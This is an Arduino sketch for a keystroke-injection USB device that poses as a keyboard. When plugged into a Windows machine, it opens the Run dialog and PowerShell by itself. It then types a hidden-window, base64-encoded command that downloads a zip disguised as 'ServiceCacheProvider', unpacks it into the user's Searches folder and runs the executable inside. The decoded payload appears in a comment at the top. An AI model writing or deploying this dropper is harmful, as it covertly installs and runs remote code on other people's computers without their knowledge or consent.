#include <Arduino.h>
#include <Keyboard.h>

/*
$zip = "$env:TEMP\ServiceCacheProvider.zip";$dest = "$env:USERPROFILE\Searches";Invoke-WebRequest -Uri "https://github.com/Fede-ai/Controller/releases/download/v0.0.0-alpha/ServiceCacheProvider.zip" -OutFile $zip;Expand-Archive -Path $zip -DestinationPath $dest -Force;Remove-Item $zip;Start-Process -FilePath (Join-Path $dest "ServiceCacheProvider\ServiceCacheProvider.exe");exit

$cmd = "..."
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
*/

const char encoded[] PROGMEM = "JAB6AGkAcAAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAUwBlAHIAdgBpAGMAZQBDAGEAYwBoAGUAUAByAG8AdgBpAGQAZQByAC4AegBpAHAAIgA7ACQAZABlAHMAdAAgAD0AIAAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABTAGUAYQByAGMAaABlAHMAIgA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8ARgBlAGQAZQAtAGEAaQAvAEMAbwBuAHQAcgBvAGwAbABlAHIALwByAGUAbABlAGEAcwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwB2ADAALgAwAC4AMAAtAGEAbABwAGgAYQAvAFMAZQByAHYAaQBjAGUAQwBhAGMAaABlAFAAcgBvAHYAaQBkAGUAcgAuAHoAaQBwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHoAaQBwADsARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAJAB6AGkAcAAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIAAkAGQAZQBzAHQAIAAtAEYAbwByAGMAZQA7AFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAegBpAHAAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAoAEoAbwBpAG4ALQBQAGEAdABoACAAJABkAGUAcwB0ACAAIgBTAGUAcgB2AGkAYwBlAEMAYQBjAGgAZQBQAHIAbwB2AGkAZABlAHIAXABTAGUAcgB2AGkAYwBlAEMAYQBjAGgAZQBQAHIAbwB2AGkAZABlAHIALgBlAHgAZQAiACkAOwBlAHgAaQB0AA==";

void typeFromProgmem(const char *p) {
  for (uint16_t i = 0; ; ++i) {
    char c = (char)pgm_read_byte_near(p + i);
    if (c == 0) 
		break;

    Keyboard.write(c);
  }
}

void setup() {
	delay(2000);
	Keyboard.begin();

	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press('r');
	Keyboard.releaseAll();
	delay(2000);

	Keyboard.print("powershell");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	delay(3000);

	Keyboard.print("powershell -w hidden -EncodedCommand ");
  	typeFromProgmem(encoded);
	Keyboard.print(";exit");
	delay(300);

	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();

	delay(1000);
	Keyboard.end();
}

void loop() {
	delay(1000);
}
